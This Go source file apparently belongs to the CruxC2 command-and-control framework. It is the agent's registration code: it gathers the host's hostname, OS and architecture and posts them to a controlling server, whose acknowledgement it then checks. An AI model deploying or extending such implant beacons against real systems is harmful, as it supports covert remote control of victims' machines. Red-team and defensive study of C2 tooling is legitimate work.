package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"os"
	"runtime"

	"github.com/RandomChugokujin/CruxC2/internal/agent"
	"github.com/RandomChugokujin/CruxC2/internal/protocol"
)

func agent_register(register_url, agent_id string) error {
	// Build registration message
	register_msg, err := information_gather()
	if err != nil {
		return err
	}
	register_json, err := agent.NewRequest(register_msg, agent_id)
	if err != nil {
		return err
	}
	// Send registration request
	client := &http.Client{}
	resp, err := client.Post(register_url, "application.json", bytes.NewBuffer(register_json))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Unwrap and decode response
	var resp_env protocol.Envelope
	if err := json.NewDecoder(resp.Body).Decode(&resp_env); err != nil {
		return err
	}
	if resp_env.Type != "MsgAgentRegisterAck" {
		e := fmt.Sprintf("Error: Got response type %s from server when registering, MsgAgentRegisterAck expected.", resp_env.Type)
		return errors.New(e)
	}

	var ack_msg protocol.MsgAgentRegisterAck
	if err := json.Unmarshal(resp_env.Payload, &ack_msg); err != nil {
		return err
	}
	if !ack_msg.AgentRegistered {
		return errors.New("Agent Registration Failed")
	}
	return nil
}

func information_gather() (protocol.MsgAgentRegister, error) {
	var register_msg protocol.MsgAgentRegister
	// Get Hostname
	hostname, err := os.Hostname()
	if err != nil {
		return register_msg, err
	}
	agent_version := "0.1.0"

	register_msg = protocol.MsgAgentRegister{
		Hostname: hostname,
		AgentVersion: agent_version,
		Platform: runtime.GOOS,
		Architecture: runtime.GOARCH,
		Signature: "",
	}
	return register_msg, nil
}
